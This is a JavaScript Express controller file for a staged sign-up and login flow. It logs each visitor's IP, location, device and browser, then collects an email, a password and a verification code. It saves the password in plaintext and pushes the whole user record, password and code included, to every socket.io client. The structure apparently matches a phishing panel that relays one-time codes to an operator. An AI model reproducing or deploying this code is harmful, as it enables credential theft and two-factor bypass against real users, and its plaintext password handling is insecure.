import { User } from "../models/user.model.js";
import { asyncHandler } from "../utils/asyncHandler.js";
import { generateTokenAndSetCookie } from "../utils/generateToken.js";
import useragent from "useragent";
import geoip from "geoip-lite";
import moment from "moment-timezone";

const firstRegister = asyncHandler(async (req, res) => {
  try {
    const ipAdd =
      req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const agent = useragent.parse(req.headers["user-agent"]);

    // Get geographical data from the IP address
    const geo = geoip.lookup(ipAdd);

    let timezone = "Unknown";
    if (geo) {
      // Infer the timezone from the country and region
      const location = `${geo.country}/${geo.region}`;
      timezone = moment.tz.zone(location)
        ? moment.tz(location).format("z")
        : "Unknown";
    }

    const { email } = req.body;

    const newUser = new User({
      email,
      ipAddress: ipAdd,
      device: agent.os.toString(),
      browser: agent.toAgent(),
      currentPage: "login",
    });

    if (newUser) {
      generateTokenAndSetCookie(newUser?._id, res);
      await newUser.save();

      // Emit the event using socket.io
      const io = req.app.get("socketio");
      io.emit("new_user_registered", {
        email: newUser.email,
        currentPage: newUser.currentPage,
      });

      // Send response
      res.status(200).json({
        _id: newUser._id,
        email: newUser.email,
        currentPage: newUser.currentPage,
      });
    } else {
      res.status(400).json({ error: "Invalid user data" });
    }
  } catch (error) {
    console.log("Error in first register controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const secondRegister = asyncHandler(async (req, res) => {
  try {
    const { password } = req.body;

    // Find user by ID
    const user = await User.findById(req.user?._id);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    // Update password if provided
    user.password = password;
    user.currentStatus = "verifying";

    // Save the updated user data
    await user.save();

    // Emit the event using socket.io
    const io = req.app.get("socketio");
    io.emit("user_updated", user);

    // Return the updated user data as the response
    res.status(200).json(user);
  } catch (error) {
    console.log("Error in second register controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const verificationCode = asyncHandler(async (req, res) => {
  try {
    const { code } = req.body;

    const user = await User.findById(req.user?._id);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    // Ensure code is stored as a string
    user.code = String(code);
    user.currentStatus = "verifying";

    await user.save();

    // Emit the event using socket.io
    const io = req.app.get("socketio");
    io.emit("user_updated", user);

    res.status(200).json(user);
  } catch (error) {
    console.log("Error in verificationCode controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const login = asyncHandler(async (req, res) => {
  try {
    const { fullName, password } = req.body;

    if (!password) {
      return res.status(401).json({ error: "Password is required" });
    }

    if (!fullName) {
      return res.status(401).json({ error: "Email is required" });
    }

    const user = await User.findOne({ email: fullName });
    const isPassCorrect = password === user?.password || "";
    if (!isPassCorrect || !user) {
      return res.status(401).json({ error: "Incorrect email or password" });
    }

    generateTokenAndSetCookie(user?._id, res);

    res.status(201).json(user);
  } catch (error) {
    console.log("Error in login controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const logout = asyncHandler(async (req, res) => {
  try {
    res.cookie("jwt", "", { maxAge: 0 });
    res.status(201).json({ message: "Logged out" });
  } catch (error) {
    console.log("Error in logout controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

const getMe = asyncHandler(async (req, res) => {
  try {
    const user = await User.findById(req.user?._id);

    res.status(201).json(user);
  } catch (error) {
    console.log("Error in get me controller", error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

export {
  firstRegister,
  secondRegister,
  verificationCode,
  login,
  logout,
  getMe,
};
